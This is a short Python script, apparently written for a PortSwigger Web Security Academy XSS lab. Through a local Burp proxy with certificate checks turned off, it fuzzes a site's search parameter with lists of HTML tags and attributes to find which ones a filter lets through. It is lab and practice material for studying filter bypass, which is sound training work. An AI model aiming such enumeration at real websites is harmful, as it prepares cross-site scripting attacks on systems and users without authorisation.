import requests
import urllib3

urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

class XSSEnumerate:
    
    def __init__(self):
        lab_id = "0af6002d036fa93582e78382000d0002"
        self.url = f"https://{lab_id}.web-security-academy.net/?search="
        self.proxies = {"https":"http://127.0.0.1:8080"}

    def query_tag(self, tag):
        response = requests.get(f"{self.url}<{tag}>", proxies=self.proxies, verify=False)
        if response.status_code == 200:
            return tag
            
    def enumerate_tags(self):
        with open(".\\tags.txt", "r") as file:
            tags = [line.strip() for line in file.readlines()]
        
        self.found_tags = []
        for tag in tags:
            found_tag = self.query_tag(tag)
            if found_tag:
                self.found_tags.append(found_tag)
            
        return self.found_tags
        

    def query_attribute(self, attribute):
        payloads = []
        for tag in self.found_tags:
            response = requests.get(f"{self.url}<{tag} {attribute}>", proxies=self.proxies, verify=False)
            if response.status_code == 200:
                payloads.append(f"<{tag} {attribute}>")
                
        return payloads
    
    def enumerate_attributes(self):
        with open(".\\attributes.txt", "r") as file:
            attributes = [line.strip() for line in file.readlines()]
            
        consolidated = []
        for attribute in attributes:
            payloads = self.query_attribute(attribute)
            if payloads:
                for payload in payloads:
                    consolidated.append(payload)
        
        return sorted(consolidated)
            
    def get_payload(self):
        print(self.enumerate_tags())
        #print(self.enumerate_attributes())


def main():
    XSSEnumerate().get_payload()
    
if __name__ == "__main__":
    main()
